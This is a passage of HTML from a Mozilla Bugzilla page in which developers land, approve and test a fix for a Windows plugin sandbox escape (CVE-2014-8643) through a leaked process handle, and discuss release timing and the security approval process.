        id="ct-44" data-comment-id="9764983">(In reply to Andrew McCreight [:mccr8] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c42">comment #42</a>)
<span class="quote">&gt; Setting B2G to unaffected because I don't think we have a GMP sandbox there.</span >

Confirmed; it's desktop only at this time.</pre></div><div class="change-set" id="c45"><div class="comment" data-id="9765997" data-no="45"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-45" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a441067_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a441067_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-45"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-45" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c45">Comment 45</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 16:01 PST" data-time="1420675266">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-45">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-45" data-comment-id="9765997"><a rel="nofollow" href="https://hg.mozilla.org/integration/mozilla-inbound/rev/6c8f62d7fd1c">https://hg.mozilla.org/integration/mozilla-inbound/rev/6c8f62d7fd1c</a></pre></div><div class="change-set" id="c46"><div class="comment" data-id="9768320" data-no="46"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-46" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_277293" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/8378311bf1bd5e9eddc7896a07688876?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_277293" id="a441067_7044"><a class="email disabled" href="/user_profile?user_id=277293" > <span class="fna">Carsten Book [:Tomcat]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-46"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-46" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c46">Comment 46</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 05:32 PST" data-time="1420723975">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-46">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-46" data-comment-id="9768320"><a rel="nofollow" href="https://hg.mozilla.org/mozilla-central/rev/6c8f62d7fd1c">https://hg.mozilla.org/mozilla-central/rev/6c8f62d7fd1c</a></pre><div class="activity"><div class="change">Status: NEW &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2015-01-08 05:32 PST" data-time="1420723975">7 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox37&amp;o1=isnotempty">status-firefox37</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox37&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox37&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; mozilla37</div></div></div><div class="change-set" id="c47"><div class="comment" data-id="9768619" data-no="47"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-47" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a441067_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a441067_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-47"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-47" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c47">Comment 47</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 06:53 PST" data-time="1420728823">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-47">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-47" data-comment-id="9768619">Comment on <span class=""><a href="/attachment.cgi?id=8545254" name="attach_8545254" title="mc handle fix">attachment 8545254</a> <a href="/attachment.cgi?id=8545254&amp;action=edit" title="mc handle fix">[details]</a> <a href="/attachment.cgi?id=8545254&amp;action=diff" title="mc handle fix">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1117140&amp;attachment=8545254'>[review]</a>
mc handle fix

Approval Request Comment
[Feature/regressing bug #]:
Caused by long standing bugs in ipc code.
[User impact if declined]:
GMP media plugin sandbox integrity is compromised.
[Describe test coverage new/current, TBPL]:
Landed on mc 1/8/2015, try pushed listed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c41">comment 41</a>.
[Risks and why]:
From what I understand about the GMP protocols this shouldn't regress anything. However we should give this some bake time on mc and QA needs to test GMP functionality as well before we roll out an official release with this.
[String/UUID change made/needed]:
none.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: approval-mozilla-release?</div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: approval-mozilla-beta?</div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: approval-mozilla-aurora?</div></div></div><div class="change-set" id="c48"><div class="comment" data-id="9769086" data-no="48"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-48" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_406194" id="a441067_7044"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-48"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-48" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c48">Comment 48</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 08:27 PST" data-time="1420734437">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-48">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-48" data-comment-id="9769086">This should have gotten sec-approval before landing, because it is a sec-high or sec-critical bug that affects more than trunk.  We're really late in beta so it may be too late to land this there, particularly for a patch that sounds like it has some risks.</pre></div><div class="change-set" id="c49"><div class="comment" data-id="9769359" data-no="49"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-49" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a441067_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a441067_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-49"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-49" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c49">Comment 49</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 09:07 PST" data-time="1420736844">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-49">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-49" data-comment-id="9769359">(In reply to Andrew McCreight [:mccr8] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c48">comment #48</a>)
<span class="quote">&gt; This should have gotten sec-approval before landing, because it is a
&gt; sec-high or sec-critical bug that affects more than trunk.  We're really
&gt; late in beta so it may be too late to land this there, particularly for a
&gt; patch that sounds like it has some risks.</span >

My mistake, I don't work on these that often.

<a rel="nofollow" href="https://wiki.mozilla.org/Security/Bug_Approval_Process">https://wiki.mozilla.org/Security/Bug_Approval_Process</a>

Will follow this in the future.</pre></div><div class="change-set" id="c50"><div class="comment" data-id="9769849" data-no="50"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-50" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a441067_7044"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-50"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-50" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c50">Comment 50</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 10:32 PST" data-time="1420741928">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-50">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-50" data-comment-id="9769849">There really is no way to take this on 35 without respinning all the builds for the release on Tuesday. We already have release candidates.</pre></div><div class="change-set" id="c51"><div class="comment" data-id="9770823" data-no="51"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-51" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_74434" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/548818210f62827ca515f319b88c3339?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_74434" id="a441067_7044"><a class="email " href="/user_profile?user_id=74434" > <span class="fna">Maire Reavy [:mreavy]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-51"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-51" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c51">Comment 51</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 13:55 PST" data-time="1420754131">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-51">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-51" data-comment-id="9770823">fyi: lsblakk is planning to cut a new release candidate later today, but that means we'd have to land and ship this today.   

Talking with jimm and jesup, the issue is getting some manual testing on this.  I've added ehugg and drno to this bug who can us figure that out.

Per jimm in private irc: &quot;what changed here had very little to do with what gmp actually does. what we did was take away a handle from ipc code that it would use to initiate connections to the browser from the plugin.  afaik, gmp's protocol doesn't do that based on looking over the protocol spec.&quot;

So basically this is just closing a security vulnerability, not changing how gmp works.</pre></div><div class="change-set" id="c52"><div class="comment" data-id="9771202" data-no="52"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-52" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a441067_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-52"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-52" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c52">Comment 52</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 14:51 PST" data-time="1420757519">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-52">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-52" data-comment-id="9771202">(In reply to Maire Reavy [:mreavy] (Plz needinfo me) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c51">comment #51</a>)
<span class="quote">&gt; fyi: lsblakk is planning to cut a new release candidate later today, but
&gt; that means we'd have to land and ship this today.   
&gt; 
&gt; Talking with jimm and jesup, the issue is getting some manual testing on
&gt; this.  I've added ehugg and drno to this bug who can us figure that out.
&gt; 
&gt; Per jimm in private irc: &quot;what changed here had very little to do with what
&gt; gmp actually does. what we did was take away a handle from ipc code that it
&gt; would use to initiate connections to the browser from the plugin.  afaik,
&gt; gmp's protocol doesn't do that based on looking over the protocol spec.&quot;
&gt; 
&gt; So basically this is just closing a security vulnerability, not changing how
&gt; gmp works.</span >

It's also worth noting that, since <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to &quot;low&quot; (in addition to using `SetDelayedIntegrityLevel` to set integrity to &quot;untrusted&quot; later)"
   href="/show_bug.cgi?id=1027902">bug 1027902</a> landed on 27-11-2014, on Windows the call to base::OpenProcessHandle has been failing (silently) and we've been passing null to GMPProcessChild's constructor anyway.
It looks like this hasn't caused any problems on Nightly or Aurora since then.</pre></div><div class="change-set" id="c53"><div class="comment" data-id="9771232" data-no="53"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-53" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_272375" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/d5497c1ef1eb10029cff0fef1764e7fa?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_272375" id="a441067_7044"><a class="email " href="/user_profile?user_id=272375" > <span class="fna">Lukas Blakk [:lsblakk] use ?needinfo</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-53"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-53" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c53">Comment 53</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 14:59 PST" data-time="1420757997">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-53">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-53" data-comment-id="9771232">Comment on <span class=""><a href="/attachment.cgi?id=8545254" name="attach_8545254" title="mc handle fix">attachment 8545254</a> <a href="/attachment.cgi?id=8545254&amp;action=edit" title="mc handle fix">[details]</a> <a href="/attachment.cgi?id=8545254&amp;action=diff" title="mc handle fix">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1117140&amp;attachment=8545254'>[review]</a>
mc handle fix

Talked this over in IRC with mreavy and we're going to take this in the 35.0 build 3 that is driven by <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - FTE tour and room/call notifications are broken when Loop becomes unthrottled"
   href="/show_bug.cgi?id=1119189">bug 1119189</a> so that we're not shipping with a sec-critical fix landed and exposed for 6 weeks in other branches.  The manual testing done by jesup, ehugg, drno and mreavy (who know OpenH264 testing better than anybody else at Mozilla -- which is what's at risk here) provides the level of confidence needed to take this risk.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: <span class="activity-deleted">approval-mozilla-release?</span></div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: approval-mozilla-release+</div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: <span class="activity-deleted">approval-mozilla-beta?</span></div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: <span class="activity-deleted">approval-mozilla-aurora?</span></div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: approval-mozilla-aurora+</div></div></div><div class="change-set" id="c54"><div class="comment" data-id="9771310" data-no="54"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-54" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a441067_7044"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-54"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-54" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c54">Comment 54</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 15:10 PST" data-time="1420758627">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-54">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-54" data-comment-id="9771310"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-aurora/rev/2946946fa0a9">https://hg.mozilla.org/releases/mozilla-aurora/rev/2946946fa0a9</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-beta/rev/38970bbf6e2d">https://hg.mozilla.org/releases/mozilla-beta/rev/38970bbf6e2d</a>

Will merge to m-r when it's looking green on beta.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=isnotempty">status-firefox35</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=equals&amp;v1=wontfix">wontfix</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox36&amp;o1=isnotempty">status-firefox36</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox36&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox36&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a541098_280903"><div class="change" id="aa541098_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a541098_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a541098_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a541098_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a541098_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a541098_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 15:50 PST" data-time="1420761027">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [adv-main35+]</div></div></div><div class="change-set" id="a541360_280903"><div class="change" id="aa541360_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a541360_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a541360_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a541360_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a541360_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a541360_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 15:54 PST" data-time="1420761289">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2014-8643</div></div></div><div class="change-set" id="a544808_280903"><div class="change" id="aa544808_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a544808_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a544808_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a544808_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a544808_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a544808_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 16:52 PST" data-time="1420764737">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: sec-bounty?</div></div></div><div class="change-set" id="c55"><div class="comment" data-id="9772313" data-no="55"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-55" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a544808_280903"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a544808_280903"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-55"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-55" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c55">Comment 55</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-08 18:57 PST" data-time="1420772255">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-55">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-55" data-comment-id="9772313"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-release/rev/38970bbf6e2d">https://hg.mozilla.org/releases/mozilla-release/rev/38970bbf6e2d</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=isnotempty">status-firefox35</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c56"><div class="comment" data-id="9774884" data-no="56"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-56" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11539" id="a544808_280903"><img src="https://secure.gravatar.com/avatar/ae002109ba1cfbb7f5ad990cc5d9fbaf?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11539" id="a544808_280903"><a class="email " href="/user_profile?user_id=11539" > <span class="fna">Randell Jesup [:jesup] (needinfo me)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-56"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-56" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c56">Comment 56</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-09 08:33 PST" data-time="1420821205">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-56">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-56" data-comment-id="9774884">tested RC3 on Win7 (win32 build) with OpenH264 forced in pc_test.html.  Looks good. Previously had tested the Try builds including testing crashing the plugin (making sure it got handled right), multiple H.264 calls at once, etc.  Tested Linux for good measure (should be (and was) unaffected).</pre></div><div class="change-set" id="a607074_279663"><div class="change" id="aa607074_279663">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a607074_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_279663" id="a607074_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a607074_279663"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a607074_279663">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a607074_279663">Updated</a>
          </h3>
          &bull;
